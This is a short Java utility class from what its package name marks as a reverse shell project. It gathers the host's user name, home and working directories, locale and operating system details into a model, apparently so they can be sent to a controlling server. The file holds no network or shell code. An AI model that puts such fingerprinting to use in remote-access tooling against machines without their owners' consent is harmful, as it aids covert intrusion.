package com.mtattab.reverseshell.util;

import com.mtattab.reverseshell.model.ServerRestCommunicationModel;
import lombok.experimental.UtilityClass;

@UtilityClass
public class OSUtil {
    public static ServerRestCommunicationModel getComputerInfo() {

        return ServerRestCommunicationModel.builder()
                .userName(System.getProperty("user.name"))
                .userLanguage(System.getProperty("user.language"))
                .userCurrentWorkingDir(System.getProperty("user.dir"))
                .userHome(System.getProperty("user.home"))
                .userRegion(System.getProperty("user.region"))
                .osName(System.getProperty("os.name"))
                .osArch(System.getProperty("os.arch"))
                .osVersion(System.getProperty("os.version"))

                .build();


    }

}
